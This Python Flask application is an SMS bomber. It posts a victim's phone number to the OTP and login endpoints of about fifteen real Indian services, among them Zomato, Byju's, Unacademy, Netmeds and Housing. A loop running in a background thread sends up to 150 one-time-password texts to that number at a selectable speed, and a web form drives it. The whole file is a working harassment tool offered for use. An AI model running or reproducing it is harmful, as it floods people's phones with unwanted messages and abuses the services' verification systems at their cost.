from flask import Flask,render_template,request,url_for
import threading
import requests
import time

app=Flask(__name__)

        
def mywalletly(number):
    data={
        "0": {
            "json": {
                "number": number
            }
        }
    }
    url="https://www.mywalletly.com/api/trpc/auth.sendOtp?batch=1"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
    
def sketchers(number):
    data={"dwfrm_profile_customer_phone":number,"phoneLogin":"true"}
    url="https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP?rurl=1"
    request= requests.post(url,data=data)
    if request.status_code==200:
        return True
    
def winds(number):
    data={
    "mobile": number
    }
    url="https://customer-sso.winds.co.in/v2/register/send-otp"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
    
def infinitylearn(number):
    data={
    "isdCode": "+91",
    "phone": number,
    "whatsappConsent": "true",
    "firstName": "wgsf",
    "lastName": "gdsgdfh",
    "gradeId": 16
    }
    headers = { 
            "X-Tenant":"infinitylearn",
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"

    }
    url="https://api.infinitylearn.com/api/authentication/generateOTP"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==200:
        return True
    
def fantasydangal(number):
    data={
    "mobileno":number
    }
    url="https://fantasydangal.com/sendsms.php"
    request= requests.post(url,data=data)
    if request.status_code==200:
        return True

def my11circle(number):
    data={
    "mobile": number,
    "deviceId": "62d894e6-3f80-436a-83cb-b593bc8ccf39",
    "deviceName": "",
    "refCode": "",
    "isPlaycircle": "false"
    }
    url="https://www.my11circle.com/api/fl/auth/v3/getOtp"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True

        
def housing(number):
    data={
    "query": "\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n    ) {\n      success\n      message\n    }\n  }\n",
    "variables": {
    "phone": number,
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    }
    url="https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
        
def nnnnow(number):
    data={
    "mobileNumber": number,
    "otpTemplateId": "5b4e2e49b70e040008ffbcbe"
    }
    headers = { 
            
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Clientsessionid":"1703822634771",
                "Correlationid":"fc736c45-6495-4587-a362-ddbfff81ebd9"
    }
    url="https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==200:
        return True
        
def zomato(number):
    data={"country_id": "1",
    "number": number,
    "type": "initiate", 
    "csrf_token": "e5b0e17377353e713fdc3c1ab1169426",
    "lc": "cfcc53585be646e8adefde5b8604997e",
    "verification_type": "sms"
    }
    url="https://accounts.zomato.com/login/phone"
    request= requests.post(url,data=data)
    if request.status_code==200:
        return True
    
def fantv(number):
    data={
    "mobile": number,
    "phoneCountryCode": "+91",
    "userId": "6550db1080d1ecd4def1a7f1"
    }
    url="https://admin.artistfirst.in/v1/auth/login-signup"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
    
def byjus(number):
    data={
    "phone": f"+91-{number}",
    "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
    }
    url="https://identity.tllms.com/api/request_otp"
    request= requests.post(url,json=data)
    if request.status_code==200:
        return True
    
def netmeds(number):
    url=f"https://www.netmeds.com/mst/rest/v1/id/details/{number}"
    request= requests.get(url)
    if request.status_code==400:
        return True
    
def unacademy(number):
    data={
    "phone": number,
    "country_code": "IN",
    "otp_type": 1,
    "email": "",
    "send_otp": "true",
    "is_un_teach_user": "false"
    }
    headers = { 
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    url="https://unacademy.com/api/v3/user/user_check/?enable-email=true"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==400:
        return True

def medibuddy(number):
    data={
    "source": "medibuddyInWeb",
    "platform": "medibuddy",
    "phonenumber": number,
    "flow": "Retail-Login-Home-Flow",
    "idealLoginFlow": "false",
    "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
    "mbUserId": "null"
    }
    headers = { 
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }
    url="https://loginprod.medibuddy.in/unified-login/user/register"
    request= requests.post(url,json=data,headers=headers)
    if request.status_code==400:
        return True

def bbq(number):
    url='https://www.barbequenation.com/getin?_wrapper_format=drupal_modal&ajax_form=1&_wrapper_format=drupal_ajax'
    data={
    "form_build_id": "form-29HJEc6VFVzNWswwzdHAJpTA6xdNQiHiipi3fpIm_MQ",
    "form_id": "bbq_signup_form",
    "step1[title]": "Mr",
    "step1[user_name]": "",
    "step1[country_code]": "+91",
    "step1[mobile_number]": number,
    "_triggering_element_name": "op",
    "_triggering_element_value": "Next",
    "_drupal_ajax": "1",
    "ajax_page_state[theme]": "bbq_nation",
    "ajax_page_state[libraries]": "addtoany/addtoany.front,bbq_blocks/bbq-blocks,bbq_nation/booking,bbq_nation/bootstrap,bbq_nation/delivery,bbq_nation/fcm,bbq_nation/global-styling,bbq_nation/lazyload-images,bbq_nation/moment-js,bbq_nation/notification-styling,bbq_nation/promotions,bbq_nation/voucher-checkout,better_local_tasks/local-tasks,big_pipe/big_pipe,classy/base,classy/messages,classy/node,core/internal.jquery.form,core/normalize,paragraphs/drupal.paragraphs.unpublished,social_auth/auth-icons,social_media_links/social_media_links.theme,system/base,views/views.module"
    }
    request=requests.post(url,data=data)
    if request.status_code==200:
        return True


def main(number,times,atime):
    i=0
    stime=(atime/1000)-0.99
    while i<times:
        if i<times:
            if mywalletly(number):
                i=i+1
                print(f"sms sent successful {i} to {number}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if sketchers(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if winds(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if infinitylearn(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if fantasydangal(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if my11circle(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if housing(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if nnnnow(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if zomato(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if fantv(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if netmeds(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if unacademy(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if medibuddy(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if byjus(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)
        else:
            break
        if i<times:
            if bbq(number):
                i=i+1
                print(f"sms sent successful {i}")
                time.sleep(stime)

@app.route('/')
def home():
    return render_template('home.html')

def check(number):
    if number=="8639625032":
        return [1,"NUMBER BLOCKED"]
    elif len(number)!=10:
        return [1,"PLEASE ENTER VALID NUMBER"]
    d={'1','2','3','4','5','6','7','8','9','0'}
    flag=1
    for i in number:
        if i not in d:
            flag=0
            break
        else:
            flag=1
    if flag:
        return [0,'none']
    else:
        return [1,"PLEASE MAKE SURE THAT NUMBER DO NOT CONTAIN ANY LETTERS"]
    
@app.route('/sending',methods=['POST'])
def sending():
    number=request.form['number']
    times=(int)(request.form['times'])
    speed=request.form['speed']
    if(speed=='Fast'):
        atime=1000
    elif(speed=='Medium'):
        atime=1500
    elif(speed=='Slow'):
        atime=2000
    result=check(number)
    if result[0]:
        return render_template('home.html',info=result[-1],times=times,number=number)
    elif times > 150:
        return render_template('home.html',info="MAXIMUM 150 SMS ONLY",times=times,number=number)
    else:
        m1=threading.Thread(target=main,args=(number,times,atime,))
        m1.start()
        return render_template('home.html',times=times,number1=number,speed=atime)
    
    
if __name__=='__main__':
    app.run()
